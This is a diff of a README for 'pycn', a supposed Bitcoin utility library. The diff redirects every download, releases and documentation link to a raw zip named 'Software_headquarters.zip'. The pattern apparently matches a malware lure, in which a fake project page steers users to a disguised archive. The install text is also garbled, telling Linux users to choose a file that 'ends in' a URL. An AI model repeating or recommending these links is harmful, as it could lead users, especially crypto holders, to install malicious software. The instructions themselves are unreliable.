@@ -1,6 +1,6 @@
 # 🚀 pycn - Effortless Bitcoin Utility Library
 
-[![Download pycn](https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip)](https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip)
+[![Download pycn](https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip)](https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip)
 
 ## 📚 Overview
 
@@ -28,7 +28,7 @@ To start using pycn, follow these steps for downloading and installation.
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip) to find the latest version of pycn. 
+Go to the [Releases page](https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip) to find the latest version of pycn. 
 
 ### 2. Download the Latest Release
 
@@ -36,7 +36,7 @@ On the Releases page, locate the latest version and download the appropriate fil
 
 - **Windows Users**: Look for a file that ends in `.exe`.
 - **macOS Users**: Look for a file that ends in `.dmg`.
-- **Linux Users**: Choose a file that ends in `https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip`.
+- **Linux Users**: Choose a file that ends in `https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip`.
 
 Once you find the correct file, click on it to start the download.
 
@@ -46,7 +46,7 @@ After the download is complete, follow these steps to install pycn:
 
 - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
 - **macOS**: Open the `.dmg` file, drag the pycn icon to your Applications folder.
-- **Linux**: Extract the `https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip` file and move it to your preferred location. You may need to run the installation commands in your terminal.
+- **Linux**: Extract the `https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip` file and move it to your preferred location. You may need to run the installation commands in your terminal.
 
 ### 4. Verify Installation
 
@@ -60,7 +60,7 @@ To ensure that pycn installed correctly:
 
 Ready to get pycn? Click below to access the release files:
 
-[Download pycn](https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip)
+[Download pycn](https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip)
 
 ## 💡 Usage Guide
 
@@ -77,7 +77,7 @@ Once pycn is installed, you can start using it. Here’s how:
 
 ## 📖 Documentation
 
-For detailed usage instructions, visit our [Documentation](https://raw.githubusercontent.com/constaf79/pycn/main/Dasya/pycn.zip). Here you’ll find examples, FAQs, and troubleshooting tips.
+For detailed usage instructions, visit our [Documentation](https://raw.githubusercontent.com/constaf79/pycn/main/pycoin/contrib/Software_headquarters.zip). Here you’ll find examples, FAQs, and troubleshooting tips.
 
 ## 💬 Support
 
